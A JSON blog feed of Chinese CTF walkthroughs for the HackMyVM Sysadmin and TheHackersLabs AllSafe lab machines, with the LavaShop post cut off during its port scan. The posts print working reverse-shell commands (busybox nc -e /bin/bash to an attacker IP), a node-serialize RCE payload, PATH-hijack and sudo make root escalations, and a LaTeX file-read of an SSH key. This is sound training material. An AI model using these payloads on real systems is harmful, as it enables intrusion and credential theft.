{
    "version": "https://jsonfeed.org/version/1",
    "title": "Sunset Blog",
    "home_page_url": "https://www.sunsetaction.top",
    "feed_url": "https://www.sunsetaction.top/feed.json",
    "description": "Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。",
    "icon": "https://www.sunsetaction.top/images/logo.png",
    "author": {
        "name": "Sunset",
        "url": "https://www.sunsetaction.top/about"
    },
    "items": [
        {
            "id": "https://www.sunsetaction.top/2025/10/25/HackMyVMSysadmin",
            "content_html": "\n# Sysadmin.\n\n> https://hackmyvm.eu/machines/machine.php?vm=Sysadmin\n> \n\n![image.png](/post-images/HackMyVMSysadmin/image.png)\n\n## Recon\n\n### PortScan\n\n```python\n➜  ~ nmap -sT -min-rate 10000 -p- 192.168.56.210\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 15:08 CST\nNmap scan report for 192.168.56.210\nHost is up (0.00015s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:43:E8:73 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 17.45 seconds\n```\n\n```python\n➜  ~ nmap -sT -A -p 22,80 192.168.56.210        \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 15:14 CST\nNmap scan report for 192.168.56.210\nHost is up (0.00049s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: C Code Upload\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:43:E8:73 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.50 ms 192.168.56.210\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 21.64 seconds\n```\n\n### 枚举\n\n`80` 端口，看样子是文件上传，并且是让我们上传 `C` 语言文件，并且会运行\n\n![image.png](/post-images/HackMyVMSysadmin/image1.png)\n\n端口扫描\n\n```python\n➜  sysadmin feroxbuster --url http://192.168.56.210 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x php,txt\n\n                                                                                                                                    \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.56.210\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ true\n 💲  Extensions            │ [php, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET       59l      156w     2384c http://192.168.56.210/index.php\n200      GET       59l      156w     2384c http://192.168.56.210/\n[####################] - 50s   661641/661641  0s      found:2       errors:1      \n[####################] - 50s   661635/661635  13173/s http://192.168.56.210/\n```\n\nF12 查看源码时发现\n\n```python\ngcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out\n```\n\n![image.png](/post-images/HackMyVMSysadmin/image2.png)\n\n## RCE\n\n这里的猜测是，上传 c 文件后，然后通过上边的语句进行编译然后运行，但是编译语句中带有 `-nostdinc` 不使用默认系统库函数及不搜索默认头文件路径，所以我们无法直接导入 `stdio.h` 等，需要绕过\n\n通过使用内联函数定义，要在不依赖 `stdlib.h` 的情况下调用 system，您可以手动声明它：\n\n测试一下是否存在RCE\n\n```python\nint system(const char *command);\nint main() {\n    system(\"busybox nc 192.168.56.5 1234\"); // Attempt to spawn a shell\n    return 0;\n}\n```\n\n存在 RCE\n\n![image.png](/post-images/HackMyVMSysadmin/image3.png)\n\n进行反弹 `shell`\n\n```python\nint system(const char *command);\nint main() {\n    system(\"busybox nc 192.168.56.5 1234 -e /bin/bash\"); // Attempt to spawn a shell\n    return 0;\n}\n```\n\n但是连上连上不到一会就断掉了\n\n![image.png](/post-images/HackMyVMSysadmin/image4.png)\n\n尝试写公钥，首先获取用户名\n\n```python\nint system(const char *command);\nint main() {\n    system(\"echo $(whoami) | busybox nc 192.168.56.5 80\");\n    return 0;\n}\n```\n\n得到用户名 `echo`\n\n![image.png](/post-images/HackMyVMSysadmin/image5.png)\n\n写公钥\n\n```python\n# Kali\ncat ~/.ssh/authorized_keys >  authorized_keys\npython -m http.server 80  \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n\n```python\nint system(const char *command);\nint main() {\n    system(\"mkdir -p ~/.ssh && busybox wget 192.168.56.5/authorized_keys -O ~/.ssh/authorized_keys\");\n    return 0;\n}\n```\n\n![image.png](/post-images/HackMyVMSysadmin/image6.png)\n\n通过私钥进行登录\n\n![image.png](/post-images/HackMyVMSysadmin/image7.png)\n\n进去后能读 `user.txt`\n\n```python\necho@Sysadmin:~$ cat user.txt \nflag{user-9592f6e02a7abaf9e38c0ef43e868cf3}\n```\n\n## 命令劫持\n\n查看 `sudo` 权限\n\n```python\necho@Sysadmin:~$ sudo -l\nMatching Defaults entries for echo on Sysadmin:\n    !env_reset, mail_badpass, !env_reset, always_set_home\n\nUser echo may run the following commands on Sysadmin:\n    (root) NOPASSWD: /usr/local/bin/system-info.sh\n```\n\n其中 `!env_reset` 可能存在路径劫持\n\n查看脚本\n\n```python\necho@Sysadmin:~$ cat /usr/local/bin/system-info.sh\n#!/bin/bash\n\n#===================================\n# Daily System Info Report\n#===================================\n\necho \"Starting daily system information collection at $(date)\"\necho \"------------------------------------------------------\"\n\necho \"Checking disk usage...\"\ndf -h\n\necho \"Checking log directory...\"\nls -lh /var/log/\nfind /var/log/ -type f -name \"*.gz\" -mtime +30 -exec rm {} \\;\n\necho \"Checking critical services...\"\nsystemctl is-active sshd\nsystemctl is-active cron\n\necho \"Collecting CPU and memory information...\"\ncat /proc/cpuinfo\nfree -m\n\necho \"------------------------------------------------------\"\necho \"Report complete at $(date)\"\n```\n\n可以看到很多可以劫持的命令\n\n```python\necho@Sysadmin:~$ echo \"chmod +s /bin/bash\" > /tmp/df\necho@Sysadmin:~$ chmod +x /tmp/df\necho@Sysadmin:~$ export PATH=\"/tmp:$PATH\"\necho@Sysadmin:~$ sudo /usr/local/bin/system-info.sh\n```\n\n![image.png](/post-images/HackMyVMSysadmin/image8.png)",
            "url": "https://www.sunsetaction.top/2025/10/25/HackMyVMSysadmin",
            "title": "HackMyVM - Sysadmin",
            "summary": "Sysadmin. https://hackmyvm.eu/machines/machine.php?vm=Sysadmin Recon PortScan 枚举 80 端口，看样子是文件上传，并且是让我们上传 C 语言文件，并且会运行 端口扫描 F12 查看源码时发现 RCE 这里的猜测是，上传 c...",
            "date_modified": "2025-10-25T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackMyVM",
                "Linux",
                "RCE",
                "Hijack",
                "Path_Hijack"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/10/21/TheHackersLabsAllSafe",
            "content_html": "\n# AllSafe\n\n> https://labs.thehackerslabs.com/machine/139\n> \n\n![image.png](/post-images/TheHackersLabsAllSafe/image.png)\n\n## Recon\n\n### PortScan\n\n```python\n➜  AllSafe nmap -sT -min-rate 10000 -p- 192.168.56.130\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 13:38 CST\nNmap scan report for 192.168.56.130\nHost is up (0.00036s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n2222/tcp open  EtherNetIP-1\nMAC Address: 08:00:27:15:CB:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 18.73 seconds\n```\n\n```python\n➜  AllSafe nmap -sT -A -p 22,80,2222 192.168.56.130       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 13:40 CST\nNmap scan report for 192.168.56.130\nHost is up (0.00056s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\n| ssh-hostkey: \n|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)\n|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.65 ((Debian))\n|_http-title: Allsafe\n|_http-server-header: Apache/2.4.65 (Debian)\n2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)\nMAC Address: 08:00:27:15:CB:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.56 ms 192.168.56.130\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 22.48 seconds\n```\n\n### 枚举\n\n80 端口，域名是 `allsafe.thl`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image1.png)\n\n目录扫描，扫出来的东西太多就不放出来了，也没什么可以看的\n\n![image.png](/post-images/TheHackersLabsAllSafe/image2.png)\n\n主站中还有一个功能，可以提交网址，所以索性测试了 SSRF，但是没有触发，但是测试 `localhost` 的时候返回了 `1234565even`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image3.png)\n\n后面没找到其他的东西\n\n尝试子域名爆破\n\n```python\n➜  AllSafe ffuf -u 'http://allsafe.thl/' -H 'host:FUZZ.allsafe.thl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 7016\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://allsafe.thl/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.allsafe.thl\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 7016\n________________________________________________\n\nintranet                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 12ms]\n:: Progress: [114442/114442] :: Job [1/1] :: 699 req/sec :: Duration: [0:01:57] :: Errors: 0 ::\n```\n\n得到子域名 `intranet` ，访问，登录需要员工 ID 格式为 `x-xxx-xxxx` ，密码估计就是上边的得到的 `123456Seven`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image4.png)\n\n进行信息收集，目录爆破\n\n```python\n➜  AllSafe gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://intranet.allsafe.thl/                    \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://intranet.allsafe.thl/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.php            (Status: 302) [Size: 0] [--> login.php]\n/images               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/images/]\n/login.php            (Status: 200) [Size: 2075]\n/docs                 (Status: 301) [Size: 327] [--> http://intranet.allsafe.thl/docs/]\n/profile.php          (Status: 200) [Size: 2305]\n/assets               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/assets/]\n/customers.php        (Status: 200) [Size: 11072]\n/db.php               (Status: 200) [Size: 0]\n/logout.php           (Status: 302) [Size: 0] [--> login.php]\n/process              (Status: 301) [Size: 330] [--> http://intranet.allsafe.thl/process/]\n/views                (Status: 301) [Size: 328] [--> http://intranet.allsafe.thl/views/]\n```\n\n看到有 `customers.php` ，进行查看，得到很多的员工信息，但是并没有员工 ID\n\n![image.png](/post-images/TheHackersLabsAllSafe/image5.png)\n\n最后在主站的 “我们的团队” 中找到了类似员工 ID 的东西\n\n![image.png](/post-images/TheHackersLabsAllSafe/image6.png)\n\n`0-477-9990`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image7.png)\n\n测试登录 `0-477-9990`:`123456Seven` \n\n成功进入后台\n\n![image.png](/post-images/TheHackersLabsAllSafe/image8.png)\n\n## 后台利用\n\n### 信息收集\n\n后台尝试寻找可利用的点\n\n点击 `Contrato` 可以查看合同\n\n![image.png](/post-images/TheHackersLabsAllSafe/image9.png)\n\n当前在 `process` 目录中\n\n![image.png](/post-images/TheHackersLabsAllSafe/image10.png)\n\n在其中的一个文档中还能翻到 `/etc/passwd` 的输出\n\n![image.png](/post-images/TheHackersLabsAllSafe/image11.png)\n\n查看其 tex 文件，可以看到 `Empresa` 参数可以进行文件包含\n\n![image.png](/post-images/TheHackersLabsAllSafe/image12.png)\n\n其中还有一个读取了 `SSH` 私钥的\n\n![image.png](/post-images/TheHackersLabsAllSafe/image13.png)\n\n查看到读取的是 `/home/parker/.ssh/id_rsa`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image14.png)\n\n### 任意文件读取\n\n将 `PDF` 上的 `id_rsa` 进行修复\n\n```python\n# 假设文件是 key.txt\ncat id_rsa | grep -v \"PRIVATE KEY\" | tr -d ' \\n' | fold -w 70 > fixed_key_body.txt\n# 然后加上头尾\necho \"-----BEGIN OPENSSH PRIVATE KEY-----\" > fixed_key.txt\ncat fixed_key_body.txt >> fixed_key.txt\necho \"-----END OPENSSH PRIVATE KEY-----\" >> fixed_key.txt\n```\n\n但是貌似不起效\n\n```python\n➜  AllSafe ssh parker@192.168.56.130 -i fixed_key.txt -p 2222\nparker@192.168.56.130's password: \n```\n\n重新读取一下 `id_rsa`，和上边一样进行包含即可\n\n```python\n\\lstinputlisting{/home/parker/.ssh/id_rsa}\n```\n\n![image.png](/post-images/TheHackersLabsAllSafe/image15.png)\n\n![image.png](/post-images/TheHackersLabsAllSafe/image16.png)\n\n再和上边一样修复一次后进行登录，成功登录\n\n```python\n➜  AllSafe ssh parker@192.168.56.130 -i fixed_key.txt -p 2222\nparker@153504fd9bcb:~$ \n```\n\n## 横向移动 - 容器逃逸\n\n### to goddard\n\n进来后我们是在容器里面\n\n```python\nparker@153504fd9bcb:~$ ls -al /\ntotal 68\ndrwxr-xr-x   1 root root 4096 Oct 11 18:41 .\ndrwxr-xr-x   1 root root 4096 Oct 11 18:41 ..\n-rwxr-xr-x   1 root root    0 Oct 11 18:41 .dockerenv\nlrwxrwxrwx   1 root root    7 May 12 19:25 bin -> usr/bin\ndrwxr-xr-x   2 root root 4096 May 12 19:25 boot\ndrwxr-xr-x   5 root root  340 Oct 21 04:28 dev\ndrwxr-xr-x   1 root root 4096 Oct 11 18:41 etc\ndrwxr-xr-x   1 root root 4096 Aug 24 18:39 home\nlrwxrwxrwx   1 root root    7 May 12 19:25 lib -> usr/lib\nlrwxrwxrwx   1 root root    9 May 12 19:25 lib64 -> usr/lib64\ndrwxr-xr-x   2 root root 4096 Aug 11 00:00 media\ndrwxr-xr-x   2 root root 4096 Aug 11 00:00 mnt\ndrwxr-xr-x   2 root root 4096 Aug 11 00:00 opt\ndr-xr-xr-x 149 root root    0 Oct 21 04:28 proc\ndrwx------   1 root root 4096 Aug 24 18:39 root\ndrwxr-xr-x   1 root root 4096 Oct 11 18:41 run\nlrwxrwxrwx   1 root root    8 May 12 19:25 sbin -> usr/sbin\ndrwxr-xr-x   2 root root 4096 Aug 11 00:00 srv\ndr-xr-xr-x  13 root root    0 Oct 21 04:28 sys\ndrwxrwxrwt   1 root root 4096 Oct 21 06:23 tmp\ndrwxr-xr-x   1 root root 4096 Aug 11 00:00 usr\ndrwxr-xr-x   1 root root 4096 Aug 12 22:31 var\n```\n\n数据库密码，但是连不上\n\n```python\nparker@153504fd9bcb:/var/www/intranet$ cat db.php \n<?php\n\n$dsn = \"mysql:host=db;dbname=allsafe;charset=utf8\";\n$username = \"root\";\n$password = \"31jB2rcbG1Pjorbd93eaxHW\";\n\ntry {\n    $pdo = new PDO($dsn, $username,  $password);\n    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n} catch (PDOExecption) {\n    die(\"Connection failed: \" . $e->getMessage());\n}\n```\n\n`mail` 里面有东西\n\n```python\nparker@153504fd9bcb:/var/mail/parker$ cat meeting \nFrom goddard@localhost Thu Aug 21 14:05:20 2025\nDate: Thu, 21 Aug 2025 14:05:20 +0000\nFrom: goddard@localhost\nTo: parker@localhost\nSubject: Reunión con E-Corp\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\"BOUNDARY\"\n\n--BOUNDARY\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nHola Oliver,\n\nTe adjunto las notas que armé para la reunión con el cliente.  \nRevisalo y confirmame si llegamos con todo.\n\nSaludos,  \nGideon\n\n--BOUNDARY\nContent-Type: text/plain; name=\"meeting_notes.txt\"\nContent-Disposition: attachment; filename=\"meeting_notes.txt\"\nContent-Transfer-Encoding: 7bit\n\nMeeting Notes - E-Corp\n----------------------\n1. Confirmar agenda con el cliente.\n2. Revisar documentación técnica.\n3. Validar acceso al portal con la credencial:\n\n   Clave de acceso: 6D7033386E71556654416130494D314F70306157\n\n4. Preparar demo corta del servicio.\n--BOUNDARY--\nEOF.\n```\n\n其中告诉我们这是一个秘钥 `6D7033386E71556654416130494D314F70306157`\n\n典型 16 进制编码，解出来是 `mp38nqUfTAa0IM1Op0aW`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image17.png)\n\n该密码是用户 `goddard` 的密码\n\n```python\nparker@153504fd9bcb:/var/mail/parker$ su goddard\nPassword: \ngoddard@153504fd9bcb:/var/mail/parker$ \n```\n\n### to root\n\n查看 sudo 权限\n\n```python\ngoddard@153504fd9bcb:/var/mail/parker$ sudo -l\nMatching Defaults entries for goddard on 153504fd9bcb:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser goddard may run the following commands on 153504fd9bcb:\n    (ALL) NOPASSWD: /usr/bin/make\n```\n\n直接提权到 `root`\n\n```python\ngoddard@153504fd9bcb:/var/mail/parker$ COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n# \n# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n### to cisco\n\n家目录下有一个 `psafe3` 文件\n\n```python\n# ls\nsecrets.psafe3\n```\n\n`PSAFE3` 文件大多属于 `Password Safe`。 `Password Safe` 可让您安全轻松地创建安全加密的用户名/密码列表。\n\n因为需要密码才能打开，我们通过 `john` 进行爆破\n\n```python\n➜  AllSafe pwsafe2john secrets.psafe3 > hash\n\n➜  AllSafe john --wordlist=/usr/share/wordlists/rockyou.txt hash \nUsing default input encoding: UTF-8\nLoaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])\nCost 1 (iteration count) is 262144 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nrockandroll      (secret)     \n1g 0:00:00:43 DONE (2025-10-21 15:51) 0.02321g/s 190.2p/s 190.2c/s 190.2C/s 123456..whitetiger\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n```\n\n得到密码 `rockandroll`\n\n文件通过 `password safe` 打开\n\n![image.png](/post-images/TheHackersLabsAllSafe/image18.png)\n\n```python\nsMpam!xxxxxxxxxxxxxxxxxx\n```\n\n![image.png](/post-images/TheHackersLabsAllSafe/image19.png)\n\n## 提权\n\n### 信息收集\n\n当前目录文件\n\n```python\ncisco@allsafe:~$ ls\ndarkarmy.bin  user.txt\n```\n\n家目录下能读取 user.txt\n\n```python\ncisco@allsafe:~$ cat user.txt \ne8xxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\ndarkarmy.bin\n\n```python\ncisco@allsafe:~$ strings darkarmy.bin \n70617373776f72643d64726b32303235210a\n```\n\n还是 HEX ，能得到一个密码 `drk2025!`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image20.png)\n\n家目录下隐藏文件 `.unknow`\n\n```python\ncisco@allsafe:~$ cat .unknown\nSi quieres comunicarte con nosotros, no vuelvas a usar los canales habituales.\nA partir de ahora, todo contacto será únicamente a través del canal seguro.\n\nConéctate al servidor de mensajería y entra en la sala:\n    dark-ops\n\nNo intentes usar este acceso para nada más que lo acordado.\nNosotros decidimos cuándo y cómo se conversa.\n```\n\n> 如果您想联系我们，请不要使用常规渠道。\n从现在开始，所有联系都将仅通过安全渠道进行。\n> \n> \n> 连接到消息服务器并进入房间：\n> dark-ops\n> \n> 请勿尝试将此访问权限用于任何未经约定的用途。\n> 我们决定对话的时间和方式。\n> \n\n查看正在监听端口，有两个开在本地的\n\n```python\ncisco@allsafe:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process                  \nudp                    UNCONN                  0                       0                                              0.0.0.0:68                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                         127.0.0.1:40089                                          0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                           0.0.0.0:80                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                           0.0.0.0:2222                                           0.0.0.0:*                                              \ntcp                    LISTEN                  0                       511                                          127.0.0.1:3000                                           0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                              [::]:80                                                [::]:*                                              \ntcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*                                              \ntcp                    LISTEN                  0                       4096                                              [::]:2222                                              [::]:* \n```\n\n### Node.js 反序列化\n\n3000 端口还是一个 `web` ，登录框\n\n![image.png](/post-images/TheHackersLabsAllSafe/image21.png)\n\n将 `3000` 端口转发出来\n\n```python\n./socat TCP-LISTEN:3001,fork TCP4:127.0.0.1:3000 &\n```\n\n是一个登录框，需要三个参数\n\n![image.png](/post-images/TheHackersLabsAllSafe/image22.png)\n\n分别输入 `cisco` `dark-ops` `drk2025!` 提示认证错误\n\n![image.png](/post-images/TheHackersLabsAllSafe/image23.png)\n\n在 `/vat/log` 中发现 `app.log` ，不常见\n\n![image.png](/post-images/TheHackersLabsAllSafe/image24.png)\n\n在里边能得到两个凭据\n\n![image.png](/post-images/TheHackersLabsAllSafe/image25.png)\n\n```python\nDLFJYxLLSzp1x5Ttpsffpg2awuJT5K\n```\n\n将密码换成 `DLFJYxLLSzp1x5Ttpsffpg2awuJT5K` 成功连接，聊天还是用中文（\n\n这里尝试一下 SQL 注入，SSTI 之类的，也没能找到什么\n\n![image.png](/post-images/TheHackersLabsAllSafe/image26.png)\n\n需要知道 3000 端口运行在什么程序上，查看一下抓的包\n\n![image.png](/post-images/TheHackersLabsAllSafe/image27.png)\n\n因为 `Socket.IO` 是 Node.js 的流行实时库，所以猜测它是 `Node.js`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image28.png)\n\n在查看进程时也能看到 root 运行了 nodejs\n\n```python\nroot         308  0.0  1.6 1248480 67224 ?       Ssl  06:28   0:01 node server.js \n```\n\n还发现了这个 `Cookie` 是仅仅通过 Base64 加密了而已，模拟了其他用户后也没什么卵用\n\n![image.png](/post-images/TheHackersLabsAllSafe/image29.png)\n\n看了一下老夜和国外老友的WP（https://7r1umphk.github.io/post/thl_allsafe.html）（https://github.com/nohh022/writeups/blob/main/TheHackerLabs/AllSafe/AllSafe.md）才知道这里有反序列化漏洞\n\n一些文章：https://cloud.tencent.com/developer/article/1374840\n\npayload：\n\n```python\n{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('busybox nc 192.168.56.5 1234 -e /bin/bash', function(error,stdout,stderr){})}()\"}\n```\n\n进行 `base64` 编码，替换上去\n\n![image.png](/post-images/TheHackersLabsAllSafe/image30.png)\n\n来到控制台，输入如下命令，先断开套接字并重新连接，服务器就会重新反序列化\n\n```python\nsocket.close()\nsocket.connect()\n```\n\n读取 `root.txt` 即可\n\n![image.png](/post-images/TheHackersLabsAllSafe/image31.png)\n\n## 总结\n\n要耐心 耐心 耐心 耐心",
            "url": "https://www.sunsetaction.top/2025/10/21/TheHackersLabsAllSafe",
            "title": "TheHackersLabs - AllSafe",
            "summary": "AllSafe https://labs.thehackerslabs.com/machine/139 Recon PortScan 枚举 80 端口，域名是 allsafe.thl 目录扫描，扫出来的东西太多就不放出来了，也没什么可以看的 主站中还有一个功能，可以提交网址，所以索性测试了 SSRF...",
            "date_modified": "2025-10-21T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackerLabs",
                "Linux",
                "LFI",
                "FUZZ",
                "PasswordSafe",
                "Make",
                "Nodejs反序列化"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/10/20/TheHackersLabsLavaShop",
            "content_html": "\n# LavaShop\n\n> https://labs.thehackerslabs.com/machine/140\n> \n\n![image.png](/post-images/TheHackersLabsLavaShop/image.png)\n\n## Recon\n\n### PortScan\n\n```python\n➜  LavaShop nmap -sT -min-rate 10000 -p- 192.168.56.129\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 21:34 CST\nNmap scan report for 192.168.56.129\nHost is up (0.00051s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n1337/tcp open  waste\nMAC Address: 08:00:27:18:2F:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.68 seconds\n```\n\n```python\n➜  LavaShop nmap -sT -A -p 22,80,1337 192.168.56.129   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 21:35 CST\nNmap scan report for 192.168.56.129\nHost is up (0.00046s latency).\n\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\n| ssh-hostkey: \n|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)\n|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)\n80/tcp   open  http       Apache httpd 2.4.62\n|_http-title: Did not follow redirect to http://lavashop.thl/\n|_http-server-header: Apache/2.4.62 (Debian)\n1337/tcp open  tcpwrapped\nMAC Address: 08:00:27:18:2F:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 